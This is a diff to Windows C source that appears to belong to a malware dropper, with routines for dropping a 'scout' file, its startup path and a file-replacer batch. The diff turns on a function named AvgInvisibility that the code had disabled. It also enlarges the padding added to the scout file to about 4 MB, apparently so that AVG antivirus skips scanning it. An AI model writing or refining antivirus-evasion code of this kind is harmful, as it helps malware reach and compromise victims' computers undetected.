@@ -198,7 +198,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		Drop();
 		MySleep(1000);
 		
-		//AvgInvisibility();
+		AvgInvisibility();
 	}
 
 	UseLess();
@@ -848,7 +848,6 @@ LPWSTR CreateTempFile()
 
 
 
-#if 0
 VOID AvgInvisibility()
 {
 
@@ -915,7 +914,7 @@ VOID AvgInvisibility()
 				GetFileSizeEx(hScout, &lFileSize);
 				lPadding = lM.QuadPart - lFileSize.QuadPart;*/
 
-				DWORD dwM = 1048576 + 10;
+				DWORD dwM = (1048576 * 4) + 10;
 				DWORD dwPadding= 0;
 				DWORD dwFileSize = GetFileSize(hScout, NULL);
 
@@ -1039,7 +1038,7 @@ VOID AvgInvisibility()
 		zfree(strStartupPath);
 
 }
-#endif
+
 
 VOID CreateFileReplacerBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStartupPath, __out PWCHAR *pBatchOutName)
 {
